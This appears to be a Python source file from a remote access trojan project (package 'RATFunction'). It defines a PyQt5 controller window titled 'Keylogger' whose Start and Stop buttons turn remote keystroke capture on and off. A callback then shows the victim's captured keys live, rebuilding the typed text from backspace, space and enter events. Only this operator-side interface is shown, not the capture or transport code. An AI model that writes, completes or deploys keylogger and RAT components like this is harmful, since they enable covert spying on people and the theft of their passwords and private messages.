import threading

from PyQt5.QtGui import QTextCursor
from PyQt5.QtWidgets import QWidget, QVBoxLayout, QTextEdit, QPushButton
from RATFunction.RATFunctionUI import RATFunctionUI
from RATFunction.MyLogging import MyLogging


class MyLoggingUI(RATFunctionUI):
    def __init__(self, function: MyLogging, *args, **kwargs):
        super().__init__(function, *args, **kwargs)
        self.keylogger_function = function
        self.keylogger_function.received_keystroke_callback = self.received_keystroke_callback
        self.setWindowTitle('Keylogger')
        self.log_widget = QTextEdit()
        self.log_widget.setReadOnly(True)

        self.start_button = QPushButton('Start Keylogger', self)
        self.start_button.clicked.connect(self.start_keylogger)

        self.stop_button = QPushButton('Stop Keylogger', self)
        self.stop_button.clicked.connect(self.stop_keylogger)
        self.stop_button.setEnabled(False)

        layout = QVBoxLayout()
        layout.addWidget(self.log_widget)
        layout.addWidget(self.start_button)
        layout.addWidget(self.stop_button)
        self.setLayout(layout)

    def start_keylogger(self):
        self.keylogger_function.send_set_state(True)
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

    def stop_keylogger(self):
        self.keylogger_function.send_set_state(False)
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)

    def received_keystroke_callback(self, keystroke: str, is_special: bool):

        if not is_special:
            self.add_str(keystroke)
        elif keystroke == 'Key.backspace':
            self.remove_last_character()
        elif keystroke == 'Key.space':
            self.add_str(' ')
        elif keystroke == 'Key.enter':
            self.add_str('\n')

    def remove_last_character(self):
        current_text = self.log_widget.toPlainText()
        new_text = current_text[:-1]
        self.log_widget.setPlainText(new_text)

    def add_str(self, string):
        self.log_widget.setPlainText(self.log_widget.toPlainText() + string)

